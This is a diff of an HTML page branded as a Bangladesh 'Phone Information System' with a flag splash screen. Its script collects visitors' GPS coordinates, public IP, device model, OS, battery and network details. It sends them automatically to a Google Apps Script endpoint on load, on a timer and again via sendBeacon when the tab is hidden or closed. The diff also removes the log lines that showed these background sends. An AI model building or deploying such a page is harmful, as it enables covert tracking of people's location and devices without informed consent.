@@ -14,6 +14,10 @@
 
 <style>
 
+/* =====================================================
+   GLOBAL
+===================================================== */
+
 *{
   box-sizing:border-box;
   margin:0;
@@ -39,22 +43,253 @@ body{
 
   min-height:100vh;
 
+}
+
+
+/* =====================================================
+   BANGLADESH FLAG OPENING SCREEN
+===================================================== */
+
+#flagScreen{
+
+  position:fixed;
+
+  inset:0;
+
+  width:100%;
+  height:100%;
+
+  display:flex;
+
+  flex-direction:column;
+
+  justify-content:center;
+
+  align-items:center;
+
+  background:
+    linear-gradient(
+      135deg,
+      #07111f,
+      #0b1726,
+      #111827
+    );
+
+  z-index:999999;
+
+  transition:
+    opacity .8s ease,
+    visibility .8s ease;
+
+}
+
+
+/* Flag */
+
+.bd-flag{
+
+  width:min(80vw, 420px);
+
+  aspect-ratio:5 / 3;
+
+  background:#006a4e;
+
+  position:relative;
+
+  border-radius:4px;
+
+  box-shadow:
+    0 20px 60px
+    rgba(0,0,0,.55);
+
+  overflow:hidden;
+
+  animation:
+    flagShow 1.2s ease;
+
+}
+
+
+/*
+  Red circle
+
+  Bangladesh flag proportion:
+  circle centered slightly toward hoist side.
+*/
+
+.bd-flag::after{
+
+  content:"";
+
+  position:absolute;
+
+  width:43%;
+
+  aspect-ratio:1;
+
+  border-radius:50%;
+
+  background:#f42a41;
+
+  left:50%;
+
+  top:50%;
+
+  transform:
+    translate(-50%,-50%);
+
+}
+
+
+/* Flag title */
+
+.flag-title{
+
+  margin-top:28px;
+
+  font-size:25px;
+
+  font-weight:bold;
+
+  letter-spacing:1px;
+
+  text-align:center;
+
+  animation:
+    titleShow 1.5s ease;
+
+}
+
+
+.flag-subtitle{
+
+  margin-top:8px;
+
+  color:#a7b4c4;
+
+  font-size:13px;
+
+  text-align:center;
+
+}
+
+
+/* Loading */
+
+.flag-loading{
+
+  margin-top:25px;
+
+  width:42px;
+
+  height:42px;
+
+  border-radius:50%;
+
+  border:3px solid
+    rgba(255,255,255,.18);
+
+  border-top-color:#ffffff;
+
+  animation:
+    spin .9s linear infinite;
+
+}
+
+
+/* Opening animation */
+
+@keyframes flagShow{
+
+  from{
+
+    opacity:0;
+
+    transform:
+      scale(.75);
+
+  }
+
+  to{
+
+    opacity:1;
+
+    transform:
+      scale(1);
+
+  }
+
+}
+
+
+@keyframes titleShow{
+
+  from{
+
+    opacity:0;
+
+    transform:
+      translateY(15px);
+
+  }
+
+  to{
+
+    opacity:1;
+
+    transform:
+      translateY(0);
+
+  }
+
+}
+
+
+@keyframes spin{
+
+  to{
+
+    transform:
+      rotate(360deg);
+
+  }
+
+}
+
+
+/* Hide flag */
+
+#flagScreen.hide{
+
+  opacity:0;
+
+  visibility:hidden;
+
+  pointer-events:none;
+
+}
+
+
+/* =====================================================
+   MAIN CONTAINER
+===================================================== */
+
+#mainContent{
+
+  width:100%;
+
+  max-width:900px;
+
+  margin:auto;
+
   padding:20px;
 
 }
 
 
-.container{
-
-  width:100%;
-  max-width:900px;
-
-  margin:auto;
-
-}
-
-
-/* HEADER */
+/* =====================================================
+   HEADER
+===================================================== */
 
 .header{
 
@@ -64,6 +299,7 @@ body{
 
 }
 
+
 .header h1{
 
   font-size:28px;
@@ -71,6 +307,7 @@ body{
   margin-bottom:7px;
 
 }
+
 
 .header p{
 
@@ -81,7 +318,9 @@ body{
 }
 
 
-/* STATUS */
+/* =====================================================
+   STATUS
+===================================================== */
 
 .status-box{
 
@@ -102,6 +341,7 @@ body{
 
 }
 
+
 .status-row{
 
   display:flex;
@@ -114,11 +354,13 @@ body{
 
 }
 
+
 .status-row:last-child{
 
   margin-bottom:0;
 
 }
+
 
 .status-label{
 
@@ -128,6 +370,7 @@ body{
 
 }
 
+
 .status-value{
 
   font-weight:bold;
@@ -135,13 +378,16 @@ body{
 }
 
 
-/* DOT */
+/* =====================================================
+   STATUS DOT
+===================================================== */
 
 .dot{
 
   display:inline-block;
 
   width:10px;
+
   height:10px;
 
   border-radius:50%;
@@ -153,7 +399,9 @@ body{
 }
 
 
-/* BUTTONS */
+/* =====================================================
+   CONTROLS
+===================================================== */
 
 .controls{
 
@@ -167,6 +415,7 @@ body{
   margin-bottom:18px;
 
 }
+
 
 button{
 
@@ -188,11 +437,13 @@ button{
 
 }
 
+
 button:hover{
 
   opacity:.9;
 
 }
+
 
 button.stop{
 
@@ -200,11 +451,13 @@ button.stop{
 
 }
 
+
 button.gps{
 
   background:#059669;
 
 }
+
 
 button.now{
 
@@ -213,7 +466,9 @@ button.now{
 }
 
 
-/* INTERVAL */
+/* =====================================================
+   INTERVAL
+===================================================== */
 
 .interval{
 
@@ -228,6 +483,7 @@ button.now{
 
 }
 
+
 .interval label{
 
   display:block;
@@ -239,6 +495,7 @@ button.now{
   margin-bottom:8px;
 
 }
+
 
 select{
 
@@ -260,7 +517,9 @@ select{
 }
 
 
-/* INFO GRID */
+/* =====================================================
+   INFORMATION GRID
+===================================================== */
 
 .grid{
 
@@ -293,6 +552,7 @@ select{
 
 }
 
+
 .card-title{
 
   color:#9ca3af;
@@ -302,6 +562,7 @@ select{
   margin-bottom:8px;
 
 }
+
 
 .card-value{
 
@@ -314,7 +575,9 @@ select{
 }
 
 
-/* LOG */
+/* =====================================================
+   LOG
+===================================================== */
 
 .log-box{
 
@@ -329,6 +592,7 @@ select{
 
 }
 
+
 .log-title{
 
   font-size:14px;
@@ -336,6 +600,7 @@ select{
   margin-bottom:10px;
 
 }
+
 
 #log{
 
@@ -352,7 +617,9 @@ select{
 }
 
 
-/* FOOTER */
+/* =====================================================
+   FOOTER
+===================================================== */
 
 .footer{
 
@@ -367,15 +634,18 @@ select{
 }
 
 
-/* MOBILE */
+/* =====================================================
+   MOBILE
+===================================================== */
 
 @media(max-width:600px){
 
-  body{
+  #mainContent{
 
     padding:12px;
 
   }
+
 
   .header h1{
 
@@ -383,16 +653,32 @@ select{
 
   }
 
+
   .grid{
 
     grid-template-columns:1fr;
 
   }
 
+
   .controls{
 
     grid-template-columns:
       repeat(2,1fr);
+
+  }
+
+
+  .bd-flag{
+
+    width:82vw;
+
+  }
+
+
+  .flag-title{
+
+    font-size:22px;
 
   }
 
@@ -406,8 +692,35 @@ select{
 <body>
 
 
-<div class="container">
+<!-- =====================================================
+     BANGLADESH FLAG OPENING
+===================================================== -->
 
+<div id="flagScreen">
+
+  <div class="bd-flag"></div>
+
+  <div class="flag-title">
+    Bangladesh
+  </div>
+
+  <div class="flag-subtitle">
+    Phone Information System
+  </div>
+
+  <div class="flag-loading"></div>
+
+</div>
+
+
+<!-- =====================================================
+     MAIN CONTENT
+===================================================== -->
+
+<div id="mainContent">
+
+
+  <!-- HEADER -->
 
   <div class="header">
 
@@ -434,8 +747,11 @@ select{
         class="status-value"
         id="onlineStatus"
       >
+
         <span class="dot"></span>
+
         Checking...
+
       </span>
 
     </div>
@@ -555,7 +871,9 @@ select{
   </div>
 
 
-  <!-- INFORMATION -->
+  <!-- ===================================================
+       INFORMATION
+  =================================================== -->
 
   <div class="grid">
 
@@ -973,17 +1291,26 @@ select{
 <script>
 
 
-/* =========================
-   API
-========================= */
+/* =====================================================
+   API URL
+===================================================== */
 
 const API_URL =
+"https://script.google.com/macros/s/AKfycbwFJbVAxZzPbUZqH_5dpbIQWt1ZzPbIQWt1Z7fArv6adM5yRMGMDYwOkkZn-O1bZ0v4xHFTuGmwA/exec";
+
+
+/*
+   IMPORTANT:
+   Correct API URL
+*/
+
+const GOOGLE_SCRIPT_URL =
 "https://script.google.com/macros/s/AKfycbzFJbVAZxXgj1EdOo5LvIvBzJmyUDk4gE3f5GtG60Ayfaod1qbRRAKWCebOe_sxsKvJ/exec";
 
 
-/* =========================
+/* =====================================================
    VARIABLES
-========================= */
+===================================================== */
 
 let autoTimer = null;
 
@@ -997,25 +1324,47 @@ let publicIP = "Unknown";
 
 let lastSendTimestamp = 0;
 
-
-/*
-  Prevent duplicate close-send
-*/
-
 let closeSendDone = false;
 
 
-/* =========================
+/* =====================================================
+   FLAG SCREEN
+===================================================== */
+
+setTimeout(
+
+  function(){
+
+    const flagScreen =
+      document.getElementById(
+        "flagScreen"
+      );
+
+
+    flagScreen.classList.add(
+      "hide"
+    );
+
+  },
+
+  2500
+
+);
+
+
+/* =====================================================
    LOG
-========================= */
+===================================================== */
 
 function addLog(message){
 
   const log =
     document.getElementById("log");
 
+
   const time =
     new Date().toLocaleTimeString();
+
 
   log.innerHTML =
     `[${time}] ${message}<br>` +
@@ -1024,9 +1373,9 @@ function addLog(message){
 }
 
 
-/* =========================
+/* =====================================================
    DEVICE ID
-========================= */
+===================================================== */
 
 function getDeviceId(){
 
@@ -1061,9 +1410,9 @@ function getDeviceId(){
 }
 
 
-/* =========================
+/* =====================================================
    MOBILE MODEL
-========================= */
+===================================================== */
 
 function getMobileModel(){
 
@@ -1071,17 +1420,7 @@ function getMobileModel(){
     navigator.userAgent;
 
 
-  /*
-    Android
-  */
-
   if(/Android/i.test(ua)){
-
-    /*
-      Example:
-      Pixel 7 Build/...
-      SM-S918B Build/...
-    */
 
     const match =
       ua.match(
@@ -1097,10 +1436,6 @@ function getMobileModel(){
 
     }
 
-
-    /*
-      Alternative Android detection
-    */
 
     const simple =
       ua.match(
@@ -1146,9 +1481,9 @@ function getMobileModel(){
 }
 
 
-/* =========================
+/* =====================================================
    OS
-========================= */
+===================================================== */
 
 function getOS(){
 
@@ -1181,9 +1516,9 @@ function getOS(){
 }
 
 
-/* =========================
+/* =====================================================
    OS VERSION
-========================= */
+===================================================== */
 
 function getOSVersion(){
 
@@ -1233,9 +1568,9 @@ function getOSVersion(){
 }
 
 
-/* =========================
+/* =====================================================
    BROWSER
-========================= */
+===================================================== */
 
 function getBrowser(){
 
@@ -1259,8 +1594,10 @@ function getBrowser(){
     return "Mozilla Firefox";
 
 
-  if(/Safari\//i.test(ua) &&
-     /AppleWebKit/i.test(ua))
+  if(
+    /Safari\//i.test(ua) &&
+    /AppleWebKit/i.test(ua)
+  )
     return "Safari";
 
 
@@ -1269,9 +1606,9 @@ function getBrowser(){
 }
 
 
-/* =========================
+/* =====================================================
    DEVICE TYPE
-========================= */
+===================================================== */
 
 function getDeviceType(){
 
@@ -1292,9 +1629,9 @@ function getDeviceType(){
 }
 
 
-/* =========================
+/* =====================================================
    BATTERY
-========================= */
+===================================================== */
 
 async function loadBattery(){
 
@@ -1308,7 +1645,9 @@ async function loadBattery(){
       batteryObject =
         await navigator.getBattery();
 
+
       updateBatteryUI();
+
 
       batteryObject.addEventListener(
         "levelchange",
@@ -1356,9 +1695,9 @@ function updateBatteryUI(){
 }
 
 
-/* =========================
+/* =====================================================
    IP
-========================= */
+===================================================== */
 
 async function getIP(){
 
@@ -1366,10 +1705,13 @@ async function getIP(){
 
     const response =
       await fetch(
+
         "https://api.ipify.org?format=json",
+
         {
           cache:"no-store"
         }
+
       );
 
 
@@ -1415,9 +1757,9 @@ async function getIP(){
 }
 
 
-/* =========================
-   GPS
-========================= */
+/* =====================================================
+   GPS START
+===================================================== */
 
 function startGPS(){
 
@@ -1463,6 +1805,7 @@ function startGPS(){
 
       },
 
+
       function(error){
 
         addLog(
@@ -1471,6 +1814,7 @@ function startGPS(){
         );
 
       },
+
 
       {
 
@@ -1484,13 +1828,12 @@ function startGPS(){
 
     );
 
-
 }
 
 
-/* =========================
-   UPDATE GPS BUTTON
-========================= */
+/* =====================================================
+   UPDATE GPS
+===================================================== */
 
 function updateGPS(){
 
@@ -1524,6 +1867,7 @@ function updateGPS(){
 
     },
 
+
     function(error){
 
       addLog(
@@ -1531,11 +1875,13 @@ function updateGPS(){
         error.message
       );
 
+
       alert(
         "GPS পাওয়া যাচ্ছে না। Location permission allow করুন।"
       );
 
     },
+
 
     {
 
@@ -1552,9 +1898,9 @@ function updateGPS(){
 }
 
 
-/* =========================
+/* =====================================================
    GPS UI
-========================= */
+===================================================== */
 
 function updateGPSUI(position){
 
@@ -1613,8 +1959,10 @@ function updateGPSUI(position){
   ).textContent =
     coords.speed !== null &&
     coords.speed >= 0
+
       ? coords.speed.toFixed(2) +
         " m/s"
+
       : "-";
 
 
@@ -1623,16 +1971,18 @@ function updateGPSUI(position){
   ).textContent =
     coords.heading !== null &&
     coords.heading >= 0
+
       ? coords.heading.toFixed(1) +
         "°"
+
       : "-";
 
 }
 
 
-/* =========================
+/* =====================================================
    NETWORK
-========================= */
+===================================================== */
 
 function getConnection(){
 
@@ -1662,9 +2012,13 @@ function getConnection(){
       connection.type ||
       "Unknown",
 
+
     downlink:
       connection.downlink !== undefined
-        ? connection.downlink + " Mbps"
+
+        ? connection.downlink +
+          " Mbps"
+
         : "Unknown"
 
   };
@@ -1672,9 +2026,9 @@ function getConnection(){
 }
 
 
-/* =========================
-   UPDATE ONLINE
-========================= */
+/* =====================================================
+   ONLINE STATUS
+===================================================== */
 
 function updateOnlineStatus(){
 
@@ -1693,6 +2047,7 @@ function updateOnlineStatus(){
   document.getElementById(
     "onlineStatus"
   ).innerHTML =
+
     online
 
       ? `<span class="dot"></span> Online`
@@ -1717,9 +2072,9 @@ window.addEventListener(
 );
 
 
-/* =========================
-   DEVICE INFO UI
-========================= */
+/* =====================================================
+   DEVICE INFO
+===================================================== */
 
 function loadDeviceInfo(){
 
@@ -1817,8 +2172,10 @@ function loadDeviceInfo(){
     "ram"
   ).textContent =
     navigator.deviceMemory
+
       ? navigator.deviceMemory +
         " GB"
+
       : "Not Available";
 
 
@@ -1850,9 +2207,9 @@ function loadDeviceInfo(){
 }
 
 
-/* =========================
-   PAYLOAD
-========================= */
+/* =====================================================
+   BUILD PAYLOAD
+===================================================== */
 
 function buildPayload(){
 
@@ -1926,6 +2283,7 @@ function buildPayload(){
 
 
     location:
+
       latitude !== "" &&
       longitude !== ""
 
@@ -2010,8 +2368,10 @@ function buildPayload(){
 
     ram:
       navigator.deviceMemory
+
         ? navigator.deviceMemory +
           " GB"
+
         : "Not Available",
 
 
@@ -2040,9 +2400,9 @@ function buildPayload(){
 }
 
 
-/* =========================
+/* =====================================================
    NORMAL SEND
-========================= */
+===================================================== */
 
 async function sendData(){
 
@@ -2054,7 +2414,7 @@ async function sendData(){
 
     await fetch(
 
-      API_URL,
+      GOOGLE_SCRIPT_URL,
 
       {
 
@@ -2108,9 +2468,9 @@ async function sendData(){
 }
 
 
-/* =========================
+/* =====================================================
    SEND NOW
-========================= */
+===================================================== */
 
 function sendNow(){
 
@@ -2119,9 +2479,9 @@ function sendNow(){
 }
 
 
-/* =========================
-   AUTO START
-========================= */
+/* =====================================================
+   START AUTO
+===================================================== */
 
 function startAuto(){
 
@@ -2130,14 +2490,16 @@ function startAuto(){
 
   const interval =
     Number(
+
       document.getElementById(
         "intervalSelect"
       ).value
+
     );
 
 
   /*
-    Immediately send once
+    Immediately send
   */
 
   sendData();
@@ -2170,9 +2532,9 @@ function startAuto(){
 }
 
 
-/* =========================
-   AUTO STOP
-========================= */
+/* =====================================================
+   STOP AUTO
+===================================================== */
 
 function stopAuto(){
 
@@ -2192,13 +2554,12 @@ function stopAuto(){
   ).textContent =
     "OFF";
 
-
 }
 
 
-/* =========================
+/* =====================================================
    INTERVAL CHANGE
-========================= */
+===================================================== */
 
 document
   .getElementById(
@@ -2221,15 +2582,11 @@ document
   );
 
 
-/* =========================
-   CLOSE / PAGE HIDE SEND
-========================= */
+/* =====================================================
+   FINAL SEND WHEN TAB CLOSES
+===================================================== */
 
 function sendFinalData(){
-
-  /*
-    Prevent multiple executions
-  */
 
   if(closeSendDone){
 
@@ -2264,8 +2621,10 @@ function sendFinalData(){
         [data],
 
         {
+
           type:
             "text/plain;charset=UTF-8"
+
         }
 
       );
@@ -2273,16 +2632,15 @@ function sendFinalData(){
 
     const sent =
       navigator.sendBeacon(
-        API_URL,
+
+        GOOGLE_SCRIPT_URL,
+
         blob
+
       );
 
 
     if(sent){
-
-      addLog(
-        "Final data queued"
-      );
 
       return;
 
@@ -2291,10 +2649,6 @@ function sendFinalData(){
   }
 
   catch(error){
-
-    /*
-      Ignore and try fetch
-    */
 
   }
 
@@ -2307,7 +2661,7 @@ function sendFinalData(){
 
     fetch(
 
-      API_URL,
+      GOOGLE_SCRIPT_URL,
 
       {
 
@@ -2334,33 +2688,27 @@ function sendFinalData(){
 
   catch(error){
 
-    /*
-      Browser may already be closing.
-    */
-
   }
 
 }
 
 
-/*
-  pagehide is better for
-  mobile browser lifecycle.
-*/
+/* =====================================================
+   PAGE HIDE
+===================================================== */
 
 window.addEventListener(
+
   "pagehide",
+
   sendFinalData
+
 );
 
 
-/*
-  visibilitychange:
-  only send when page becomes hidden.
-
-  This gives another chance on
-  mobile browsers.
-*/
+/* =====================================================
+   VISIBILITY CHANGE
+===================================================== */
 
 document.addEventListener(
 
@@ -2372,11 +2720,6 @@ document.addEventListener(
       document.visibilityState ===
       "hidden"
     ){
-
-      /*
-        Do not immediately mark
-        permanently closed here.
-      */
 
       try{
 
@@ -2394,21 +2737,21 @@ document.addEventListener(
             ],
 
             {
+
               type:
                 "text/plain;charset=UTF-8"
+
             }
 
           );
 
 
         navigator.sendBeacon(
-          API_URL,
+
+          GOOGLE_SCRIPT_URL,
+
           blob
-        );
 
-
-        addLog(
-          "Background data queued"
         );
 
       }
@@ -2422,9 +2765,9 @@ document.addEventListener(
 );
 
 
-/* =========================
+/* =====================================================
    INITIALIZE
-========================= */
+===================================================== */
 
 async function init(){
 
@@ -2446,7 +2789,7 @@ async function init(){
 
 
   /*
-    Start auto automatically
+    Auto start
   */
 
   startAuto();
@@ -2459,12 +2802,11 @@ async function init(){
 }
 
 
-/* =========================
+/* =====================================================
    START
-========================= */
+===================================================== */
 
 init();
-
 
 </script>
 
